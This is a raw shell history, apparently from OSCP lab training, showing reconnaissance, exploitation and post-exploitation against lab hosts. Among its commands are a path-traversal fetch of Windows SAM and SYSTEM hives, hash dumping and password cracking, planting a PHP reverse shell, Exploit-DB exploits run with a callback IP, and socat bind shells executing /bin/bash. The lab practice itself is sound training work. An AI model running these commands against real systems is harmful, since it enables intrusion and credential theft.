 3928  2020-10-03 23:36  IP ID Sequence Generation: All zeros
 3929  2020-10-03 23:50  cd /usr/share/webshells/php
 3930  2020-10-03 23:50  cd ~/OSCP/admin_dept/results/10.3.3.47/exploit
 3931  2020-10-03 23:53  cd 10.11.1.133
 3932  2020-10-03 23:53  cherry Gh0st.ctb
 3933  2020-10-03 23:53  cherrytree Gh0st.ctb
 3934  2020-10-04 00:09  locate php/webapps/12449.txt
 3935  2020-10-04 00:23  cp ~/OSCP/results/10.11.1.133/exploit/lmao.txt ./
 3936  2020-10-04 00:23  vim lmao.txt
 3937  2020-10-04 01:51  vim /usr/share/exploitdb/exploits/php/webapps/12449.txt
 3938  2020-10-04 02:59  cd sshuttle-0.78.3
 3939  2020-10-04 03:00  cd results/10.3.3.47
 3940  2020-10-04 03:17  locate 
 3941  2020-10-04 03:17  locate php/webapps/11735.php
 3942  2020-10-04 03:18  mkdir inc
 3943  2020-10-04 03:19  touch mysql.php
 3944  2020-10-04 03:19  cat > php-reverse-shell.php inc/mysql.php 
 3945  2020-10-04 03:19  cd  onm
 3946  2020-10-04 03:19  cat  php-reverse-shell.php > inc/mysql.php 
 3947  2020-10-04 03:20  echo   php-reverse-shell.php >>  inc/mysql.php 
 3948  2020-10-04 03:20  mv php-reverse-shell.php inc
 3949  2020-10-04 03:20  cat php-reverse-shell.php > mysql.php
 3950  2020-10-04 03:21  cat php-reverse-shell.php >> mysql.php
 3951  2020-10-04 03:21  vim mysql.php
 3952  2020-10-04 03:40  vim /usr/share/exploitdb/exploits/php/webapps/11735.php
 3953  2020-10-04 03:42  cd inc
 3954  2020-10-04 04:13  pyhton python.py
 3955  2020-10-04 04:14  vim python.py
 3956  2020-10-04 04:17  vi python.py
 3957  2020-10-04 04:28  vim .getSyslog.py
 3958  2020-10-04 23:14  ssh -R 8080:127.0.0.1:8080 mario@10.3.3.42
 3959  2020-10-04 23:35  git commit -m "finished jack in the admin"
 3960  2020-10-05 00:04  gobuster dir -u http://10.3.3.201:5000/Main_Page -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.44/scans/tcp_8000_http_gobuster_big.txt"
 3961  2020-10-05 00:05  gobuster dir -u http://10.3.3.201:5000/Main_Page -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  
 3962  2020-10-05 00:34  locate 43905
 3963  2020-10-05 00:34  vim /usr/share/exploitdb/exploits/multiple/remote/43905.py
 3964  2020-10-05 00:34  cd 10.3.3.201
 3965  2020-10-05 00:34  mkdir exploit 
 3966  2020-10-05 00:34  cp /usr/share/exploitdb/exploits/multiple/remote/43905.py ./
 3967  2020-10-05 00:34  python 43905.py
 3968  2020-10-05 00:44  mkdir report
 3969  2020-10-05 00:52  cd results/10.3.3.201
 3970  2020-10-05 00:52  cd scans/
 3971  2020-10-05 00:57  cp ~/Downloads/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh ./
 3972  2020-10-05 01:00  touch perl.pl
 3973  2020-10-05 01:00  vim perl.pl
 3974  2020-10-05 02:28  cd 10.11.1.252
 3975  2020-10-05 02:28  cherrytree timeclock.ctb
 3976  2020-10-05 02:29  cd /var/www
 3977  2020-10-05 03:17  nano
 3978  2020-10-05 03:17  vim dead.letter
 3979  2020-10-05 03:18  nano dead.letter 
 3980  2020-10-05 03:25  /var/www/html/werkzeug-master/examples/test/layout.html
 3981  2020-10-05 03:37  ssh hack@10.3.3.201
 3982  2020-10-05 03:45  socat TCP4-LISTEN:1234 STDOUT
 3983  2020-10-05 03:58  python 43905.py 10.3.3.201 5000 192.168.119.217 443
 3984  2020-10-05 04:06  git commit -m "finished ezkimo"
 3985  2020-10-05 06:21  smbclient -L //10.3.3.190
 3986  2020-10-05 06:22  smbmap -H 10.3.3.190 -P 445
 3987  2020-10-05 06:24  smbclient  //10.3.3.190/ -U ""
 3988  2020-10-05 06:24  smbclient  //10.3.3.190/WORKGROUP -U ""
 3989  2020-10-05 06:25  smbclient  //10.3.3.190/HARRY -U ""
 3990  2020-10-05 06:27  gobuster dir -u http://10.3.3.190/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o ./
 3991  2020-10-05 06:28  gobuster dir -u http://10.3.3.190/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "./"
 3992  2020-10-05 06:28  gobuster dir -u http://10.3.3.190/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  
 3993  2020-10-05 20:35  sshuttle  -r  sean@10.11.1.251 10.1.1.1/24 \n
 3994  2020-10-05 20:36  ./run -r  root@10.1.1.1  10.3.3.1/24\n
 3995  2020-10-05 20:40  curl http://10.3.3.190/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C/Windows/System32/config/RegBack/system.old -o system
 3996  2020-10-05 20:43  vim system
 3997  2020-10-05 20:43  curl http://10.3.3.190/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C/Windows/System32/config/RegBack/SAM.OLD -o sam.old
 3998  2020-10-05 20:44  vim sam.old
 3999  2020-10-05 20:57  hashid S-1-5-21-1555807745-2802343042-2743742332
 4000  2020-10-05 20:57  hashid E5323505-92C8-4836-A91B-C0783F459DC9
 4001  2020-10-05 20:58  string system
 4002  2020-10-05 20:58  strings system
 4003  2020-10-05 21:00  string sam.old
 4004  2020-10-05 21:00  strings sam.old
 4005  2020-10-05 21:39  /usr/bin/lsadump
 4006  2020-10-05 21:39  sudo updatedb
 4007  2020-10-05 21:40  /usr/bin/cachedump
 4008  2020-10-05 21:41  locate / | grep cachedump
 4009  2020-10-05 21:43  locate / | grep samdump2 
 4010  2020-10-05 21:43  /usr/bin/samdump2
 4011  2020-10-05 21:44  /usr/bin/samdump2 sam.old
 4012  2020-10-05 21:44  /usr/bin/samdump2 -h sam.old
 4013  2020-10-05 21:44  /usr/bin/samdump2 sam.old > lol.txt
 4014  2020-10-05 21:44  rm lol.txt
 4015  2020-10-05 21:49  /usr/bin/samdump2 SYSTEM SAM sam.old
 4016  2020-10-05 21:49  /usr/bin/samdump2 -o lol.txt system sam.old
 4017  2020-10-05 21:52  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt lol.txt
 4018  2020-10-05 21:53  /usr/sbin/john --show 
 4019  2020-10-05 21:53  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt lol.txt
 4020  2020-10-05 21:53  /usr/sbin/john --show lol.txt
 4021  2020-10-05 21:55  touch adminpass.txt
 4022  2020-10-05 21:58  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt adminpass.txt
 4023  2020-10-05 22:00  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt adminpass.txt
 4024  2020-10-05 22:00  /usr/sbin/john --show adminpass.txt
 4025  2020-10-05 22:00  vim adminpass.txt
 4026  2020-10-05 22:00  vim lol.txt
 4027  2020-10-05 22:01  /usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt adminpass.txt
 4028  2020-10-05 22:09  cat nmap.txt
 4029  2020-10-05 23:06  cat lol.txt
 4030  2020-10-05 23:11  cat adminpass.txt
 4031  2020-10-05 23:40  git commit -m "finished harry"
 4032  2020-10-05 23:40  git pusgh
 4033  2020-10-05 23:41  git push 
 4034  2020-10-06 00:17  autorecon 10.11.1.75
 4035  2020-10-06 00:18  autorecon 10.11.1.79
 4036  2020-10-06 00:30  autorecon 10.11.1.72
 4037  2020-10-06 00:30  autorecon 10.11.1.73
 4038  2020-10-06 03:06  sudo apt search tmux
 4039  2020-10-06 03:07  sudo apt remove tmux
 4040  2020-10-06 03:12  sudo apt search
 4041  2020-10-06 03:59  cat /etc/shadow
 4042  2020-10-06 03:59  sudo cat /etc/shadow
 4043  2020-10-06 04:07  awk  /etc/passwd
 4044  2020-10-06 04:23  cat   /etc/passwd |  
 4045  2020-10-06 04:23  cut -d: -f1,3,4 /etc/passwd\n
 4046  2020-10-06 04:24  cut -d: -f1,3,5 /etc/passwd\n
 4047  2020-10-06 04:24  cut -d: -f1,3,6 /etc/passwd\n
 4048  2020-10-06 04:29  cat /etc/passwd
 4049  2020-10-06 04:42  cat /etc/passwd | grep bin/false
 4050  2020-10-06 04:42  cat /etc/passwd | grep /bin/false
 4051  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 1-7
 4052  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 2-8
 4053  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 0-8
 4054  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 1-8
 4055  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 1-3
 4056  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | cut -c 1-4
 4057  2020-10-06 04:47  cat /etc/passwd | grep /bin/false | 
 4058  2020-10-06 04:49  echo 'The user' cat /etc/passwd | grep /bin/false 
 4059  2020-10-06 04:49  echo The user cat /etc/passwd | grep /bin/false 
 4060  2020-10-06 04:49  echo The user | cat /etc/passwd | grep /bin/false 
 4061  2020-10-06 04:50  echo 'The user'; | cat /etc/passwd | grep /bin/false 
 4062  2020-10-06 04:50  echo 'The user' | cat /etc/passwd | grep /bin/false 
 4063  2020-10-06 05:55  cat /etc/passwd | grep /bin/false 
 4064  2020-10-06 06:15  echo lol | cat /etc/passwd | grep /bin/false 
 4065  2020-10-06 06:23  sed 's/^/The user /'  /etc/passwd | grep /bin/false 
 4066  2020-10-06 06:24  sed 's/^/The user/' /etc/passwd | cut -c 1-8 | grep /bin/false 
 4067  2020-10-06 06:24  sed 's/^/The user/' /etc/passwd | cut -c 1 | grep /bin/false 
 4068  2020-10-06 06:24  sed 's/^/The user/' /etc/passwd | cut -c 8 | grep /bin/false 
 4069  2020-10-06 06:25  sed 's/^/The user/' /etc/passwd | grep /bin/false | cut -c 1-8
 4070  2020-10-06 06:25  sed 's/^/The user/' /etc/passwd | grep /bin/false | cut -c 1-7
 4071  2020-10-06 06:29  sed 's/^/The user/' /etc/passwd | grep /bin/false |  awk -F ":" '{print $1, $3}'
 4072  2020-10-06 06:29  sed 's/^/The user/' /etc/passwd | grep /bin/false |  awk -F ":" '{print $1, $4}'
 4073  2020-10-06 06:30  sed 's/^/The user/' /etc/passwd | grep /bin/false |  awk -F ":" '{print $1, $5}'
 4074  2020-10-06 06:30  sed 's/^/The user/' /etc/passwd | grep /bin/false |  awk -F ":" '{print $1, $6}'
 4075  2020-10-06 06:35  sed 's/^/The user /' /etc/passwd | sed -e 's/[^ ]*[^ ]/l home directory is/3' words | grep /bin/false |  awk -F ":" '{print $1, $6}'
 4076  2020-10-06 06:36  sed 's/^/The user /' /etc/passwd | sed -e 's/[^ ]*[^ ]/ls home directory is/3' | grep /bin/false |  awk -F ":" '{print $1, $7}'
 4077  2020-10-06 06:36  sed 's/^/The user /' /etc/passwd | sed -e 's/[^ ]*[^ ]/ls home directory is/3' | grep /bin/false |  awk -F ":" '{print $1, $8}'
 4078  2020-10-06 06:36  sed 's/^/The user /' /etc/passwd | sed -e 's/[^ ]*[^ ]/ls home directory is/3' | grep /bin/false |  awk -F ":" '{print $1, $6}'
 4079  2020-10-06 06:37  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}'
 4080  2020-10-06 06:40  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | sed 's/$3/sdfsdf/'
 4081  2020-10-06 06:40  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | sed 's/^/sdfsdf/'
 4082  2020-10-06 06:40  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | sed 's/^3/sdfsdf/'
 4083  2020-10-06 06:43  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | awk '{$3="ls home directory" OFS $2} 1'
 4084  2020-10-06 06:43  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | awk '{$3="ls home directory" OFS $3} 1'
 4085  2020-10-06 06:43  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | awk '{$4="ls home directory" OFS $3} 1'
 4086  2020-10-06 06:44  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | awk '{$4=" home directory is" OFS $3} 1'
 4087  2020-10-06 06:44  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $7}' | awk '{$4=" home directory is" OFS $3} 1'
 4088  2020-10-06 06:44  sed 's/^/The user /' /etc/passwd  | grep /bin/false |  awk -F ":" '{print $1, $6}' | awk '{$4=" home directory is" OFS $4} 1'
 4089  2020-10-06 06:46  cat /etc/passwd | grep gnome
 4090  2020-10-06 06:46  cat /etc/passwd | grep Gnome
 4091  2020-10-06 06:47  cp /etc/passwd /home/kali/
 4092  2020-10-06 06:54  man cat
 4093  2020-10-06 06:54  cat /etc/passwd | sed  's/Gnome Display Manager/GDM/g'
 4094  2020-10-06 06:55  cat /etc/passwd | sed -e 's/Gnome Display Manager/GDM/g'
 4095  2020-10-06 06:55  sudo vim /etc/passwd
 4096  2020-10-06 08:40  git clone https://github.com/goonmax/RandomShit.git
 4097  2020-10-06 08:43  mv scans.tar.gz
 4098  2020-10-06 08:43  mv scans.tar.gz ../
 4099  2020-10-06 08:44  tar -xzf  scans.tar.gz
 4100  2020-10-06 08:52  diff ./
 4101  2020-10-06 08:53  vimdiff 10.11.1.118_scan_01.txt 10.11.1.118_scan_02.txt 10.11.1.234_scan_01.txt 10.11.1.234_scan_02.txt 10.11.1.8_scan_01.txt 10.11.1.8_scan_02.txt
 4102  2020-10-06 08:53  cd admin
 4103  2020-10-06 17:52  find / -mtime -2 -printf "%T@" -ls | sort\n
 4104  2020-10-06 17:53  find / -mtime -2 -printf "%T@" -ls 2>/dev/null | sort\n
 4105  2020-10-06 17:54  find / -mtime -7 -type f  -ls 2>/dev/null | sort\n
 4106  2020-10-06 17:55  find / -mtime -7 -type f   2>/dev/null | sort\n
 4107  2020-10-06 17:57  find / -mtime -7 -ls
 4108  2020-10-06 18:00  ps -x
 4109  2020-10-06 18:00  ps -x | grep firefox)
 4110  2020-10-06 18:00  ps -x | grep firefox
 4111  2020-10-06 18:02  kill -9 $(ps -x | grep 1568)
 4112  2020-10-06 18:10  top systemctl start apache2.service
 4113  2020-10-06 18:10  sudo top | systemctl start apache2.service
 4114  2020-10-06 18:11  systemctl status apache2.service
 4115  2020-10-06 18:11  sudo top
 4116  2020-10-06 18:12  tail -f /var/log/apache2/access.log 
 4117  2020-10-06 18:12  sudo tail -f /var/log/apache2/access.log 
 4118  2020-10-06 18:13  watch
 4119  2020-10-06 18:13  watch ps
 4120  2020-10-06 18:14  watch ps  mpstat
 4121  2020-10-06 18:15  watch ps aux | sort -nrk 3,3 | head -n 5
 4122  2020-10-06 18:16  watch ps aux | sort -nrk 3,3 | head -n 1
 4123  2020-10-06 18:16  watch ps aux | sort -nrk 1,1 | head -n 1
 4124  2020-10-06 18:16  watch "ps aux | sort -nrk 3,3 | head -n 5"\n
 4125  2020-10-06 18:23  wget https://www.exploit-db.com/exploits/48839 -o lol
 4126  2020-10-06 18:23  curl  https://www.exploit-db.com/exploits/48839 -o lol
 4127  2020-10-06 18:23  curl  https://www.exploit-db.com/exploits/48839 -o reee
 4128  2020-10-06 18:24  alex
 4129  2020-10-06 18:24  axle
 4130  2020-10-06 18:24  axel https://www.exploit-db.com/exploits/48839 -o aaaa
 4131  2020-10-06 18:24  wget https://www.exploit-db.com/exploits/48839 -o wow
 4132  2020-10-06 18:34  ..
 4133  2020-10-06 18:39  history
 4134  2020-10-06 19:00  vim .zshrc
 4135  2020-10-06 19:01  ww
 4136  2020-10-06 19:01  w
 4137  2020-10-06 19:01  rm -rf ./*
 4138  2020-10-06 19:02  bash
 4139  2020-10-06 19:05  kali
 4140  2020-10-06 19:08  SAVEHIST=10000000\n
 4141  2020-10-06 19:08  vim ~/.zshrc
 4142  2020-10-06 19:09  source ~/.zshrc
 4143  2020-10-06 19:13  $ sudo socat TCP4-LISTEN:443,fork file:powercat.ps1
 4144  2020-10-06 19:19  openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
 4145  2020-10-06 19:20  cat bind.
 4146  2020-10-06 19:20  cat bind.crt
 4147  2020-10-06 19:20  cat bind.key
 4148  2020-10-06 19:20  cat bind.key bind.crt L > bind.pem
 4149  2020-10-06 19:20  cat bind.pem
 4150  2020-10-06 19:24  socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT\n\n
 4151  2020-10-06 19:35  socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash
 4152  2020-10-06 19:35  socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash\n
 4153  2020-10-06 19:37  $ sudo socat TCP4-LISTEN:443,fork file:bind.pem
 4154  2020-10-06 19:47  sudo socat - OPENSSL:192.168.217.10:4443,verify=0
 4155  2020-10-06 19:50  socat - OPENSSL:192.168.168.130:4443,verify=0
 4156  2020-10-06 19:50  socat - OPENSSL:192.168.217.10:4443,verify=0
 4157  2020-10-06 19:53  sudo socat TCP4-LISTEN:443,fork 
 4158  2020-10-06 19:53  sudo socat TCP4-LISTEN:443
 4159  2020-10-06 20:57  sudo  apt install powercat,
 4160  2020-10-06 20:57  sudo  apt install powercat
 4161  2020-10-06 21:02  locate / | grep powercat.ps1
 4162  2020-10-06 21:03  find / 2>/dev/null| grep powercat.ps1
 4163  2020-10-06 21:03  find / 2>/dev/null | grep powercat.ps1
 4164  2020-10-06 21:03  cd /usr/share/windows-resources/powercat/
 4165  2020-10-06 21:26  touch rshell.ps1
 4166  2020-10-06 21:26  chmod +x rshell.ps1
 4167  2020-10-06 21:26  ./rshell.ps1
 4168  2020-10-06 21:27  sudo apt -y install powershell
 4169  2020-10-06 21:27  find / 2>/dev/null | grep powershell
 4170  2020-10-06 21:28  pwsh\n
 4171  2020-10-07 18:26  vim powercat.ps1
 4172  2020-10-07 18:46  sudo nc 192.168.217.10 443
 4173  2020-10-07 20:52  #tcpdump -i eth1 'port 80'
 4174  2020-10-07 20:52  sudo tcpdump -i tun0 'port 110'
 4175  2020-10-07 20:52  tcpdump -i tun0 'port 110'
 4176  2020-10-07 20:55  sudo tcpdump -i tun0 'port 110' -x
 4177  2020-10-07 20:56  sudo tcpdump -s -i tun0 'port 110' -x 
 4178  2020-10-07 20:56  sudo tcpdump -s -i tun0 'port 110' -x -s
 4179  2020-10-07 20:56  sudo tcpdump -i tun0 'port 110' -x -s
 4180  2020-10-07 20:56  sudo tcpdump -i tun0 'port 110' -xs
 4181  2020-10-07 20:57  sudo tcpdump -i tun0 -s 'port 110' -x
 4182  2020-10-07 20:57  sudo tcpdump -s -i tun0 'port 110' 
 4183  2020-10-07 20:58  sudo tcpdump  -i tun0 'port 110' -s
 4184  2020-10-07 20:58  sudo tcpdump  -i tun0 'port 110' -s -x
 4185  2020-10-07 20:58  sudo tcpdump   -s
 4186  2020-10-07 21:14  sudo tcpdump  -i tun0 'port 110' -x -s 0
 4187  2020-10-07 21:15  nc -nv 10.11.1.217 110
 4188  2020-10-07 21:23  tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
 4189  2020-10-07 21:23  sudo tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
 4190  2020-10-07 21:23  sudo tcpdump -r password_cracking_filtered.pcap \n
 4191  2020-10-07 21:24  tcpdump -r password_cracking_filtered.pcap | awk '{print $3}' | cut -d. -f-4 | sort | uniq -c | sort -urn
 4192  2020-10-07 21:24  sudo tcpdump -r password_cracking_filtered.pcap | awk '{print $3}' | cut -d. -f-4 | sort | uniq -c | sort -urn
 4193  2020-10-07 21:27  find / | grep  password_cracking_filtered.pcap
 4194  2020-10-07 21:27  find / 2>/dev/null | grep  password_cracking_filtered.pcap
 4195  2020-10-07 21:31  sudo tcpdump -­r password_cracking_filtered.pcap\n
 4196  2020-10-07 21:31  tcpdump -­r password_cracking_filtered.pcap
 4197  2020-10-07 21:31  sudo tcpdump -­r password_cracking_filtered.pcap
 4198  2020-10-07 21:48  for i in 10.11.1.{1..255}; do ping -c 1 $i > /dev/null; [ $? -eq 0 ]&&echo "Node with IP $i is UP." || echo "Node with IP $i isn;t around."; done
 4199  2020-10-07 21:55  python3
 4200  2020-10-07 21:59  touch pingsweep.py
 4201  2020-10-07 22:00  chmod +x p
 4202  2020-10-07 22:00  chmod +x pingsweep.py
 4203  2020-10-07 22:00  ./pingsweep.py
 4204  2020-10-07 22:02  vim pingsweep.py
 4205  2020-10-07 22:03  python pingsweep.py
 4206  2020-10-07 22:23  wget 172.30.134.79/pwk-82638-723655.pdf
 4207  2020-10-08 08:14  tcpdump -n -r password_cracking_filtered.pcap | awk -F” “ ‘{print $3}’ | sort -u | head 
 4208  2020-10-08 08:15  tcpdump -n -r password_cracking_filtered.pcap | awk 
 4209  2020-10-08 08:15  tcpdump -n -r password_cracking_filtered.pcap | awk -F” “ ‘{print $3}’ | sort -u | head
 4210  2020-10-08 08:15  tcpdump -n -r password_cracking_filtered.pcap | awk -F" " ‘{print $3}’ | sort -u | head
 4211  2020-10-08 08:15  tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort -u | head
 4212  2020-10-08 08:15  sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort -u | head
 4213  2020-10-08 08:22  sudo tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"
 4214  2020-10-08 08:23  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"
 4215  2020-10-08 08:46  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-syn|tcp-RST|tcp-ack) != 0" 
 4216  2020-10-08 08:47  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-syn|tcp-rst|tcp-ack) != 0" 
 4217  2020-10-08 09:15  tcpdump -r password_cracking_filtered.pcap -v 'tcp[tcpflags] & (tcp-rst) != 0'
 4218  2020-10-08 09:15  sudo tcpdump -r password_cracking_filtered.pcap -v 'tcp[tcpflags] & (tcp-rst) != 0'
 4219  2020-10-08 09:20  sudo tcpdump -r password_cracking_filtered.pcap -v 'tcp[tcpflags] & (tcp-rst|tcp-syn|tcp-ack) != 0'
 4220  2020-10-08 09:32  'tcp[13] == 2 or tcp[13] == 16 or tcp[13] == 4'
 4221  2020-10-08 09:36  tcpflags
 4222  2020-10-08 09:36  sudo tcpdump tcpflags
 4223  2020-10-08 09:37  sudo tcpdump man
 4224  2020-10-08 09:40  sudo tcpdump -r password_cracking_filtered.pcap -v 'tcp[13] == 2 or tcp[13] == 16 or tcp[13] == 4'
 4225  2020-10-08 09:41  sudo tcpdump -r password_cracking_filtered.pcap -v 'tcp[tcpflags] & tcp[13] == 2 or tcp[13] == 16 or tcp[13] == 4'
 4226  2020-10-08 09:41  sudo man tcpdump 
 4227  2020-10-08 20:15  tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"
 4228  2020-10-08 20:16  sudo tcpdump -r password_cracking_filtered.pcap
 4229  2020-10-08 20:16  tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"\n
 4230  2020-10-08 20:17  tcpdump "tcp[tcpflags] & (tcp-psh|tcp-ack) != 0"\n
 4231  2020-10-08 20:17  sudo tcpdump "tcp[tcpflags] & (tcp-psh|tcp-ack) != 0"\n
 4232  2020-10-08 20:17  sudo tcpdump  password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-psh|tcp-ack) != 0" \n
 4233  2020-10-08 20:17  sudo tcpdump -r
 4234  2020-10-08 20:18  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-psh|tcp-ack) != 0"  \n
 4235  2020-10-08 20:18  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"  \n
 4236  2020-10-08 20:21  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] &  tcp[13] & 8 != 0"
 4237  2020-10-08 20:30  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & tcp[13] & 8 != 0 or tcp[13] & 8 != 0"
 4238  2020-10-08 20:30  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] &  tcp[13] & 8 != 0" > lol
 4239  2020-10-08 20:30  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & tcp[13] & 8 != 0 or tcp[13] & 8 != 0" > lol2
 4240  2020-10-08 20:30  vimdiff lol lol2
 4241  2020-10-08 20:31  vim lol2
 4242  2020-10-08 20:31  rm lol lol2
 4243  2020-10-08 20:32  sudo tcpdump -A -i tun0 -n '(tcp-push|tcp-ack) != 0 and port 110'
 4244  2020-10-08 20:38  vf
 4245  2020-10-08 20:45  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & tcp[13] & 8 != 0 and "tcp[13] & 16 != 0"
 4246  2020-10-08 20:45  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & tcp[13] & 8 != 0" and "tcp[13] & 16 != 0"
 4247  2020-10-08 20:45  sudo tcpdump -r password_cracking_filtered.pcap "tcp[tcpflags] & tcp[13] & 8 != 0" and "tcp[13] & 16 != 0" > lol
 4248  2020-10-08 20:46  vim lol
 4249  2020-10-08 20:52  R
 4250  2020-10-08 20:54  tar -xzf  access_log.txt.gz
 4251  2020-10-08 20:54  sudo gunzip  access_log.txt.gz
 4252  2020-10-08 21:01  NAME=`echo "$FILE" | cut -d'.' -f1`
 4253  2020-10-08 21:02  mv access_log.txt ../oscpdata
 4254  2020-10-08 21:05  bash.sh
 4255  2020-10-08 21:05  touch getjs.sh
 4256  2020-10-08 21:05  vim getjs.sh
 4257  2020-10-08 21:08  cat access_log.txt | grep .js
 4258  2020-10-08 21:13  cat access_log.txt | grep .js | sort | awk -F "/include/" '{print $2}'
 4259  2020-10-08 21:14  cat access_log.txt | grep .js | sort | awk -F "/include/" '{print $2}' | cut -d ' '  -f  1 | sort u
 4260  2020-10-08 21:14  cat access_log.txt | grep .js | sort | awk -F "/include/" '{print $2}' | cut -d ' '  -f  1 | sort -u
 4261  2020-10-08 21:16  touch python.py
 4262  2020-10-08 21:17  chmod +x python.py
 4263  2020-10-08 21:18  ./python.py
 4264  2020-10-08 21:18  python3 p
 4265  2020-10-08 21:19  python python.py
 4266  2020-10-08 21:20  python3 python.py
 4267  2020-10-08 21:20  vim python.py 
 4268  2020-10-08 21:30  whois megacorpone.com
 4269  2020-10-08 21:30  whois NS1.MEGACORPONE.COM
 4270  2020-10-08 22:33  theharvester -d megacorpone.com -b google
 4271  2020-10-08 22:34  theHarvester -d megacorpone.com -b google
 4272  2020-10-08 22:35  theHarvester -d megacorpone.com -b duckduckgo
 4273  2020-10-08 22:36  theHarvester -b
 4274  2020-10-08 22:36  theHarvester -d megacorpone.com -b bling
 4275  2020-10-08 22:36  theHarvester -d megacorpone.com -b yahoo
 4276  2020-10-08 22:42  grep
 4277  2020-10-08 22:42  grep local
 4278  2020-10-08 23:07  host -t ns megacorpone.com
 4279  2020-10-08 23:12  touch zonetrafer.sh
 4280  2020-10-08 23:13  chmod +x zonetrafer.sh
 4281  2020-10-08 23:13  ./zonetrafer.sh ns1.megacorpone.com.
 4282  2020-10-08 23:14  host -t ns megacorpone.com | cut -d " " -f 4
 4283  2020-10-08 23:16  vim zonetrafer.sh
 4284  2020-10-08 23:33  vim  zontraferpython.py
 4285  2020-10-08 23:33  python zontraferpython.py
 4286  2020-10-08 23:33  python zontraferpython.py megacorpone.com\n
 4287  2020-10-08 23:33  touch me  megacorpone.com\n
 4288  2020-10-08 23:33  python zontraferpython.py me\n
 4289  2020-10-08 23:34  python zontraferpython.py -i me\n
 4290  2020-10-08 23:34  python zontraferpython.py -i me -o l\n
 4291  2020-10-08 23:35  python zontraferpython.py -d megacorpone.com\n
 4292  2020-10-08 23:40  ./zonetrafer.sh
 4293  2020-10-08 23:40  ./zonetrafer.sh megacorpone.com
 4294  2020-10-08 23:41  vim zonetrafer.sh 
 4295  2020-10-08 23:41  rm me
 4296  2020-10-08 23:42  rm megacorpone.com 
 4297  2020-10-08 23:46  find / 2>/dev/null | grep dnsrecon
 4298  2020-10-08 23:48  /usr/share/dnsrecon/dnsrecon.py
 4299  2020-10-08 23:48  /usr/share/dnsrecon/dnsrecon.py-d megacorpone.com -t axfr\n 
 4300  2020-10-08 23:48  /usr/share/dnsrecon/dnsrecon.py -d megacorpone.com -t axfr\n 
 4301  2020-10-08 23:49  which dnsrecon
 4302  2020-10-08 23:52  dnsrecon -d megacorpone.com -t axfr
 4303  2020-10-08 23:58  nmap -sn 10.11.1.0/24 | grep online
 4304  2020-10-09 00:00  nmap -sn 10.11.1.0/24
 4305  2020-10-09 00:02  nmap -sPn 10.11.1.0/24
 4306  2020-10-09 00:02  nmap -Pn 10.11.1.0/24
